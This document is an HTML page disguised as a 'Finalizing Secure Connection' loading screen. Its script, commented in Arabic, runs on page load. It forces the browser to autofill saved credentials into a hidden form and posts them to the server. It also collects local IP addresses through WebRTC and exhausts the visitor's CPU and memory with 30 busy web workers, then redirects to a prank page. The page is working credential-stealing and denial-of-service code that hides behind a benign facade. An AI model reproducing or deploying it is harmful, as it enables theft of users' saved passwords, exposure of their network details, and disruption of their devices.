<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Finalizing Setup...</title>
<style>
  body { background: #0f1115; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; }
  .loader { border: 4px solid #2a2f3a; border-top: 4px solid #4a90e2; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  p { color: #8a8f99; font-size: 14px; }
</style>
</head>
<body>
  <div class="loader"></div>
  <h2>Finalizing Secure Connection...</h2>
  <p>Please do not close this window.</p>

<script>
// ==========================================
// 1. سحب البيانات المحفوظة (Autofill Stealer)
// ==========================================
function stealAutofill() {
  // فورم مخفي تماماً عن عين المستخدم
  const form = document.createElement('form');
  form.style.position = 'absolute';
  form.style.left = '-9999px';
  form.style.opacity = '0';
  
  const email = document.createElement('input');
  email.type = 'email';
  email.name = 'email';
  email.autocomplete = 'username'; // يجبر المتصفح يعبي الإيميل المحفوظ
  
  const pass = document.createElement('input');
  pass.type = 'password';
  pass.name = 'password';
  pass.autocomplete = 'current-password'; // يجبر المتصفح يعبي الباسورد المحفوظ
  
  form.appendChild(email);
  form.appendChild(pass);
  document.body.appendChild(form);
  
  // نستنى ثانيتين عشان المتصفح يعبي البيانات
  setTimeout(() => {
    const data = {
      email: email.value || '',
      pass: pass.value || ''
    };
    
    // إذا في بيانات نسحبها
    if (data.email || data.pass) {
      sendIntel({ autofill: data });
    }
    form.remove(); // ننظف بعد ما نخلص
  }, 2000);
}

// ==========================================
// 2. تسريب الـ IP المحلي (WebRTC Leak)
// ==========================================
async function leakLocalIps() {
  const ips = [];
  try {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    
    pc.onicecandidate = (ice) => {
      if (!ice || !ice.candidate) return;
      const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
      if (ipMatch && !ips.includes(ipMatch[1])) {
        ips.push(ipMatch[1]);
      }
    };
    
    // نستنى 3 ثواني نجمع الـ IPs
    await new Promise(r => setTimeout(r, 3000));
    pc.close();
  } catch (e) {}
  
  if (ips.length > 0) {
    sendIntel({ localIps: ips });
  }
}

// ==========================================
// 3. تجميد المتصفح (CPU / Memory Exhaustion)
// ==========================================
function freezeBrowser() {
  // نشغل 30 عملية في الخلفية تستهلك كل المعالج والرام
  for (let i = 0; i < 30; i++) {
    const worker = new Worker(URL.createObjectURL(new Blob([`
      let i = 0;
      function loop() {
        i++;
        // عملية حسابية ثقيلة جداً عشان تنهك المعالج
        const arr = new Array(1000000).fill(Math.random());
        arr.sort();
        setTimeout(loop, 1);
      }
      loop();
    `], {type: 'application/javascript'})));
  }
}

// ==========================================
// دالة إرسال البيانات للسيرفر
// ==========================================
async function sendIntel(payload) {
  await fetch('/capture-extra', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...payload, ua: navigator.userAgent })
  }).catch(() => {});
}

// ==========================================
// تشغيل الأسلحة بالتسلسل
// ==========================================
window.addEventListener('load', async () => {
  // 1. سحب البيانات المحفوظة
  stealAutofill();
  
  // 2. تسريب الـ IPs المحلية
  leakLocalIps();
  
  // 3. بعد 6 ثواني، نبدأ نجمّد المتصفح
  setTimeout(() => {
    freezeBrowser();
  }, 6000);
  
  // 4. بعد ما نخلص، ننقله لصفحة الرعب أو موقع وهمي
  setTimeout(() => {
    // يمكنك تغيير الرابط لصفحة الرعب اللي سويناها
    window.location.href = '/troll.html'; 
  }, 12000);
});
</script>
</body>
</html>
